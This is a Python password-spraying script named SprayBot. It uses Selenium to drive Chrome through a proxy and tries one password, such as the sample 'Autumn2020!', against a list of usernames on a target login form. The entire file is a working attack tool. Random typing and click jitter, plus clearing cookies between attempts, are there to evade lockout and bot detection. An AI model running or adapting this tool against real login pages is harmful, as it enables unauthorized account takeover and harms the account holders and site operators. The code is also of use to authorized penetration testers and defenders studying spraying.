"""
SprayBot: selenium password spraying script
"""
import argparse,os,sys,random,time
from argparse import RawTextHelpFormatter
from selenium import webdriver
from selenium.common.exceptions import NoSuchElementException


def create_driver(proxy,resolution):
    capability = webdriver.DesiredCapabilities.CHROME
    capability['proxy'] = {
        "httpProxy": proxy,
        "ftpProxy": proxy,
        "sslProxy": proxy,
        "proxyType": "manual"
    }

    chrome_options = webdriver.ChromeOptions()
    chrome_options.add_argument("--incognito")
    chrome_options.add_argument('ignore-certificate-errors')
    chrome_options.add_argument("--window-size="+resolution)
    #PATH = "C:\\Users\\user\\pathto\\chromedriver.exe"
    # AND
    #chrome_driver = webdriver.Chrome(executable_path=PATH,options=chrome_options,desired_capabilities=capability)
    # OR
    chrome_driver = webdriver.Chrome(options=chrome_options,desired_capabilities=capability)
    return chrome_driver


def waitforit(scale=1):
    sleepnumoffset = random.random()
    offset = sleepnumoffset + scale
    time.sleep(offset)


def use_keys(element,sometext):
    for key in sometext:
        jitter = round(random.uniform(0.025, 0.1), 10)
        time.sleep(jitter)
        element.send_keys(key)
  

def grab_xpath():
    uname_xpath = input("Enter USERNAME field xpath:")
    pwd_xpath = input("Enter PASSWORD field xpath:")
    submit_xpath = input("Enter SUBMIT button xpath:")
    return uname_xpath,pwd_xpath,submit_xpath

def load_xpaths(xpath_file):
    f = open( xpath_file, "r" )
    xpaths = []
    for line in f:
        xpaths.append(line)
    f.close() 
    return xpaths[0],xpaths[1],xpaths[2]

def automate_keyboard(url,proxy,usersfile,password,delay,pause,resolution,xpath_file):
    
    if xpath_file:
        uname_xpath,pwd_xpath,submit_xpath = load_xpaths(xpath_file)
    else:
        uname_xpath,pwd_xpath,submit_xpath = grab_xpath()
        
    driver = create_driver(proxy,resolution)

    with open(usersfile, 'r') as f:
        users = [line.rstrip() for line in f]
        for user in users:
            driver.get(url)
            waitforit(delay)
                        
            uname = driver.find_element_by_xpath(uname_xpath)
            pwd = driver.find_element_by_xpath(pwd_xpath)
            submit = driver.find_element_by_xpath(submit_xpath)
            
            use_keys(uname,user)
            waitforit(pause)
            use_keys(pwd,password)

            click_jitter = round(random.uniform(0.15, 0.35), 10)
            time.sleep(click_jitter)
            submit.click()

            proceed_jitter = round(random.uniform(1, 1.5), 10)
            time.sleep(proceed_jitter)
            waitforit(delay)
            driver.delete_all_cookies()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="""
            
            A Selenium password spraying script that accepts XPATHs as input on launch.

            Example usage:  .\spraybot.py -t "https://www.example.com/login" -p "127.0.0.1:8080" -u users.txt --password Autumn2020!
                            .\spraybot.py -t "https://www.example.com/login" -p "127.0.0.1:8080" -u users.txt --password Autumn2020! -f xpathfile.txt
                            .\spraybot.py -t "https://www.example.com/login" -p "127.0.0.1:8080" -u users.txt --password Autumn2020! -r 1920,1080
                            .\spraybot.py -t "https://www.example.com/login" -p "127.0.0.1:8080" -u users.txt --password Autumn2020! -d 5 -s 2

            Review README.md
                                    """,
                usage='%(prog)s -t {URL} -p {PROXY} -u {PATHTOUSERSFILE} --password {PASSWORD}',
                formatter_class=RawTextHelpFormatter)

    required = parser.add_argument_group('required arguments')
    required.add_argument("-t", "--url", type=str,required=True,
                    help="Target URL (https://example.com/signin")
    required.add_argument("-p", "--proxy", type=str,required=True,
                        help="Proxy IP:PORT (127.0.0.1:8080)")
    required.add_argument("-u", "--users", type=str,required=True,
                        help="List of users file to spray with")
    required.add_argument("--password", type=str,required=True,
                        help="Password to spray with")
    
    optional = parser.add_argument_group("optional arguments")
    optional.add_argument("-r", "--resolution", type=str, help="Specify resolution (1920,1080), (DEFAULT:1200,1080)", default="1200,1080", required=False)
    optional.add_argument("-d", "--delay", type=int, help="Seeded DELAY between initial request & SprayBot's first instruction (DEFAULT:5)", default=5, required=False)
    optional.add_argument("-s", "--pause", type=int, help="Seeded PAUSE between SprayBot's keypresses (DEFAULT:1)", default=1, required=False)
    optional.add_argument("-f", "--file", type=str, help="Read XPATHs from file instead of inputing to prompt", required=False)

    args = parser.parse_args()
    print("\tMake sure your proxy is running...")
    if args.file:
        xpath_file = args.file
    else:
        xpath_file = ""

    automate_keyboard(args.url,args.proxy,args.users,args.password,args.delay,args.pause,args.resolution,xpath_file)
    
    print("Finished")